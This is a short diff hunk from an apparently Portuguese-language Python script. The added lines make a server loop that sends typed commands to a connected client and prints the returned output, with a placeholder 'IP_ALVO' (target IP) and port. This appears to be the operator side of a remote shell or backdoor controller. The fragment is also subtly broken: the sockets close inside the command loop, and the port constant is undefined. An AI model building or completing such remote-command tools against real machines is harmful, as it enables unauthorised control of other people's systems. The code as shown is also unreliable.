@@ -17,4 +17,12 @@ def inciar_servidor(server_ip, server_port):
         if command.lower() == "exit":
             client_socket.send("exit".encode())
             break
-        
+        client_socket.send(command.encode())
+        resposta = client_socket.recv(4096).decode()
+        print(resposta) 
+
+        client_socket.close()
+        server_socket.close()
+
+server_ip = 'IP_ALVO'
+server_port  = PORTA_SERVIDOR      
